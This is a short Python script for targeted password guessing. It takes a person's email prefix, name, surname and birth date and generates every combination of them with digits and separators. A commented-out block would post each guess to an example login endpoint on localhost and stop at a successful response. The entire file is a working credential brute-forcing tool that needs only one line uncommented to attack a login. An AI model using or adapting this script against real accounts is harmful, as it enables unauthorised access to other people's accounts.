import requests

# initialization of vars
email = input('Enter Email: ').split('@')[0]
name = input('Enter name: ')
surname = input('Enter surname: ')
day, month, year = map(str, input(
    'Enter date of birth(dd.mm.yyyy): ').split('.'))

# the list that stores our generating data
alphalist = [email, name, surname, day, month,
             year, '_', '.', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0']

base = len(alphalist)

i = 0  # counter
success = False

# generating loop
while not success:  # setting up of iteration
    password = ''
    temp = i
    while temp > 0:
        c = temp // base
        r = temp % base
        password = alphalist[r] + password
        temp = c

    print(i, password)
    # response = requests.post('http://127.0.0.1:5000/auth',  # an example of website
    #                          json={'login': 'login', 'password': password})
    # if response.status_code == 200:
    #     print('SUCCESS', password)
    #     success = True

    i += 1
